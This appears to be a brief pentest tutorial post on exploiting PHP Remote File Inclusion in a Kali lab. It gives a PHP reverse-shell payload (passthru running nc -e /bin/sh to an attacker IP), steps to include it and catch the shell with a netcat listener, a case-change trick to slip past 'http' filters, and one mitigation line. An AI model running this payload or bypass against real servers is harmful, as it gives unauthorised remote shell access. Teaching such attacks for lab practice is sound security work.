+++
categories = ["Pentest", "Web"]
date = "2021-02-08"
title = "Vulnerability Remote File Inclusion"
type = ["posts","post"]
[ author ]
  name = "nazori"
+++


* It is similar to the local file inclusion.
* Allows for the attacker to read any file at any server. 
* Executes PHP files from other servers in the current server.
* Storage PHP files from other servers as .txt.

For this to work the server under attack must have allow_url_fopen & allow_url_include ON.

1. Launch apache server on kali and create a txt file that contains:
   
``` 
<?php

passthru("nc -e /bin/sh 10.0.2.5 9999");

?>
```
2. Move the file to ``/var/www/html`` and check the server localhost/shellinversa.txt
3. Copy the url but instead of localhost the real ip and paste after ``/?page=``
4. Listen to a connection `` nc -vv -l -p 9999 ``
5. Reload page

If the security is higher you may have to replace the ``http`` with ``hTTp`` or something like that. Because maybe it is filtering by a fixed name.

To avoid this type of vulnerability we only have to set to OFF the allow_url_fopen and allow_url_include.

